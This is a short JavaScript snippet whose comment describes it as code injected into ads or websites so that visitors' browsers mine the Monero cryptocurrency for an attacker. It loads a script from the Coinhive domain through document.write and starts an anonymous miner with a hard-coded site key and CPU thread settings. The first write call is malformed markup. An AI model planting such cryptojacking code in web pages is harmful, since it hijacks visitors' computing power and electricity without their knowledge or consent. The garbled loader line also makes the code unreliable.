/**
 * snippet that is inserted into
 * an ad and/or site that makes the client
 * mine minero, a crypto-currency, for the
 * author of the code/attacker
 */

window["document"]["write"]("write type='test/javascript' src='https://coinhive.com/lib/coinhive.min.js?rnd="
    +window["Math"]["random"]()
    +"'>/<script>");

window["document"]["write"]('<script> if (navigator.hardwareConcurrency > 1){ var cpuConfig = {threads: Math.round(\
    navigator.hardwareConcurrency/3), throttle:0.6}} else {var cpuConfig = {threads: 8, throttle:0.6}} var miner = new\
    CoinHive.Anonymous(\'1GsQGpY1pivrG1VHSp5P2IIr9cyTzzXq\', cpuConfig);miner.start();</script>');